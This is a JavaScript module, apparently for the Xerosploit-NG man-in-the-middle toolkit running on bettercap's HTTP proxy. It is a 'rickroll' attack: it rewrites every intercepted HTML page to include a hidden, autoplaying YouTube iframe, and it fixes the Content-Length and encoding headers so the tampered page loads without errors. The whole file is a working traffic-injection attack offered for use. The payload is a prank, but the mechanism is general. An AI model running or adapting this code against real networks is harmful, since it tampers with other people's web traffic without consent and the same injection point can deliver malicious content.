// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- RickRoll (YouTube hijack)
//
// Inserts an autoplaying, 0x0 YouTube <iframe> into every proxied text/html
// response, using the video id from the generated global XE_VIDEO_ID.
//
// Ported from the bettercap v1 Ruby proxy module:
//   modules/rickroll.rb   (GPLv3)
// v1 read a pre-rendered `tmp/yplay.txt` iframe and did
// `response.body.sub!('<head>', contents)`; here the iframe is built from
// XE_VIDEO_ID and inserted right after <head> (the same effect), with
// </head> / end-of-document fallbacks.  HTTPS is used for the embed URL.
// Backs the "YouTube Play" (yplay) menu entry of Xerosploit.
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_VIDEO_ID  YouTube video id, e.g. "NvhZu5M41Z8".
//
// Strict passthrough: anything that is not text/html is left untouched, and
// any error is swallowed so proxied traffic is never broken.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "rickroll";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

function xeIsHtml(res) {
    return !!res && typeof res.ContentType === "string" &&
        res.ContentType.toLowerCase().indexOf("text/html") === 0;
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

function xeSetBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
    if (typeof res.RemoveHeader === "function") {
        res.RemoveHeader("Content-Encoding");
        res.RemoveHeader("Transfer-Encoding");
    }
}

// Only [A-Za-z0-9_-] survive: keeps the id from breaking out of the attribute.
function xeSanitizeVideoId(id) {
    return ("" + (id === null || id === undefined ? "" : id)).replace(/[^A-Za-z0-9_-]/g, "");
}

function onLoad() {
    var vid = (typeof XE_VIDEO_ID === "undefined") ? null : XE_VIDEO_ID;
    xeLog("loaded (video id: " + vid + ")");
}

function onResponse(req, res) {
    try {
        if (!xeIsHtml(res)) { return; }                                  // strict passthrough

        var vid = xeSanitizeVideoId((typeof XE_VIDEO_ID === "undefined") ? null : XE_VIDEO_ID);
        if (!vid) { xeWarn("XE_VIDEO_ID is not set; passing through"); return; }

        var body = xeReadBody(res);
        if (typeof body !== "string" || body.length === 0) { return; }

        var iframe = "<iframe width='0' height='0' src='https://www.youtube.com/embed/" +
            vid + "?autoplay=1' frameborder='0' allowfullscreen></iframe>";

        var lower = body.toLowerCase();
        var at = lower.indexOf("<head>");
        if (at !== -1) {
            body = body.substring(0, at + 6) + iframe + body.substring(at + 6);
        } else {
            at = lower.indexOf("</head>");
            if (at !== -1) { body = body.substring(0, at) + iframe + body.substring(at); }
            else { body = body + iframe; }
        }

        var where = (req && req.Host ? req.Host : "") + (req && req.Path ? req.Path : "");
        xeLog("inserting YouTube iframe (" + vid + ") into " + where);

        xeSetBody(res, body);
    } catch (e) {
        xeWarn("onResponse failed: " + e);                               // never break traffic
    }
}
